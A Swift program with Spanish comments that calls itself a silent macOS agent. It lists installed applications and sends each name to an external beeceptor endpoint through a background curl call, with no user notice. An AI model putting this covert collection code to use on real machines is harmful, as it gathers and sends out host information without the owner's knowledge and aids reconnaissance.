import Foundation

// Agente silencioso para macOS que escanea aplicaciones instaladas
// y las envía a una API externa

// Clase principal del agente
class SoftwareScanner {
    
    // Función para obtener la lista de aplicaciones instaladas
    func getInstalledApplications() -> [String] {
        var installedApps: [String] = []
        
        // Directorios comunes donde se instalan aplicaciones en macOS
        let appDirectories = [
            "/Applications",
            "\(NSHomeDirectory())/Applications"
        ]
        
        // Explorar cada directorio y encontrar las aplicaciones
        for directory in appDirectories {
            let fileManager = FileManager.default
            
            do {
                let contents = try fileManager.contentsOfDirectory(atPath: directory)
                
                // Filtrar por archivos .app
                let apps = contents.filter { $0.hasSuffix(".app") }
                
                for app in apps {
                    // Extraer solo el nombre sin la extensión .app
                    let appName = app.replacingOccurrences(of: ".app", with: "")
                    installedApps.append(appName)
                }
            } catch {
                print("Error al leer directorio \(directory): \(error)")
            }
        }
        
        return installedApps
    }
    
    // Función para enviar la información a la API
    func sendDataToAPI(appName: String) {
        // Crear el proceso para ejecutar curl
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/curl")
        
        // Preparar los argumentos para curl
        process.arguments = [
            "-v",
            "-X", "GET",
            "https://softceh.free.beeceptor.com",
            "-H", "some-header: \(appName)"
        ]
        
        do {
            try process.run()
            process.waitUntilExit()
        } catch {
            print("Error al ejecutar curl: \(error)")
        }
    }
    
    // Función principal para escanear y enviar datos
    func scanAndSendData() {
        let apps = getInstalledApplications()
        
        for app in apps {
            sendDataToAPI(appName: app)
            
            // Pequeña pausa entre peticiones para no sobrecargar la API
            Thread.sleep(forTimeInterval: 0.5)
        }
    }
}

// Función principal
func main() {
    let scanner = SoftwareScanner()
    
    // Ejecutar el escaneo en segundo plano
    DispatchQueue.global(qos: .background).async {
        scanner.scanAndSendData()
    }
    
    // Mantener el programa ejecutándose
    RunLoop.main.run()
}

// Iniciar el agente
main() 